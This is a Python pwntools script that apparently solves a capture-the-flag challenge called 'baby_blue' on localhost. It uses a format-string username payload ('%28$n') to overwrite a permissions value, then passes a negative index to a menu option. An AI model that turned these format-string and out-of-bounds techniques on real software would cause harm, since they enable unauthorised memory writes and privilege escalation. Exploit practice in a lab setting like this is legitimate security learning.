from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'
BINARY = "./challenge/src/baby_blue"  # Updated binary name

if args.LOCAL:
    r = process(BINARY)
else:
    r = remote("localhost", 8083)

e = ELF(BINARY)


# gdb_script = """
# b *send_letter+75
# """

def register(username):
    print("[*] Registering...")
    r.sendline("1")
    print("[*] Sending username...")
    print(r.recv().decode())
    r.sendline(username)

def login(username):
    print("[*] Logging in...")
    r.sendline("2")
    r.recvuntil(b"Enter username to login:")
    r.sendline(username)

def overwrite_permissions():
    print("[*] Overwriting permissions...")
    r.sendline("3")
    # r.recv() # you may need to remove this (needed for remote instance)
    profile = r.recv()
    print(profile.decode())



try:
    # gdb.attach(r,gdb_script)
    output = r.recvuntil(b"Exit\n>")
    print(output.decode())
    register("1")
    print(r.recv().decode())
    login("1")
    print(r.recv().decode())
    register("AAAAA%28$n")
    print(r.recv().decode())
    login("AAAAA%28$n")
    overwrite_permissions()
    print(r.recv().decode())
    login("1")

    r.sendline("4")
    r.sendline("-10")
    # print(r.clean(1).decode('utf-8', errors='ignore'))
    # r.interactive()
    print(r.clean(1).decode('utf-8', errors='ignore'))
    # print(r.recv().decode())
    # print(r.recv().decode())
    # print(r.recv().decode())
except Exception as e:
    print(f"[-] Error: {str(e)}")

finally:
    r.close()